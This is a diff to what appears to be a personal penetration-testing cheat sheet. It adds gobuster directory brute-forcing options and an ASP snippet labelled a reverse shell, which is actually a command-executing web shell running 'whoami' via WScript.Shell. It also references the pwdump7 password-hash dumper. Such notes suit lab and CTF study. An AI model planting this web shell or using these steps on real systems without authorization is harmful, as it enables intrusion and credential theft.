@@ -131,11 +131,16 @@ take a big one and remove "manual"
 
 *gobuster*
 
+For Directoy
+
     gobuster dir -u <ip> -a 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 30
 
     -ip in format http://domain.com:5000 
     -t threads
 
+To search for files add the ending like
+
+    -x aspx
 
 *Drupal*
 
@@ -1186,7 +1191,7 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-
 
     --hw 290 to take out 404 pages
 
-**Post Exploitation**
+**Exploitation**
 
 *Linux Post Exploitation*
 
@@ -1196,9 +1201,18 @@ https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-
 
 Search for flags as well
 
-**Windows Post Exploitation**
+**Windows Exploitation**
 
-    pwdump7
+*ASP Reverse Shell*
+
+    <%
+    Set rs = CreateObject("WScript.Shell")
+    Set cmd = rs.Exec("cmd /c whoami")
+    o = cmd.StdOut.Readall()
+    Response.write(o)
+    %>
+
+*pwdump7*
 
 https://www.tarasco.org/security/pwdump_7/ 
 
